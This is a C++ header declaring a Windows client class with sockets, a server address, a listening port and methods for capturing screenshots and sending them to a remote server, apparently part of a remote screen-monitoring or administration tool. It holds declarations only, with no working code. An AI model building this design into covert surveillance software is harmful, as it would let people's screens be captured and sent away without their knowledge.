#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <thread>
#include <lm.h>
#include <stdio.h>
#include <ctime>
#include <iomanip>
#include <sstream>
#include <windows.h>
#include <vector>
#include <fstream>

#define SCREENSHOT 0x15
#define GETPICPORT  25000

class ClientConnection
{

long long lasterr;
SOCKET curr_sock, listen_sock;
WSADATA wsaData;
std::string output;
std::string servip;
std::time_t currentTime;
std::thread *conAct, *ScrLis;
sockaddr_in server, listenaddr;
public: 
ClientConnection(const char*);

bool maySend=1;

void GetData();
int SendData(void*);
void SendPic(unsigned long);
const char* RetStr();
void Activity();
void ListenForScreen();
unsigned long  GetScreenData();
void Restart();
};

std::string ConvertWStringToString(const std::wstring& wstr);
void CreateBMPFile(HWND hwnd, LPTSTR pszFile, PBITMAPINFO pbi,
    HBITMAP hBMP, HDC hDC);
PBITMAPINFO CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp);
std::string base64_encode(const std::vector<BYTE>& data);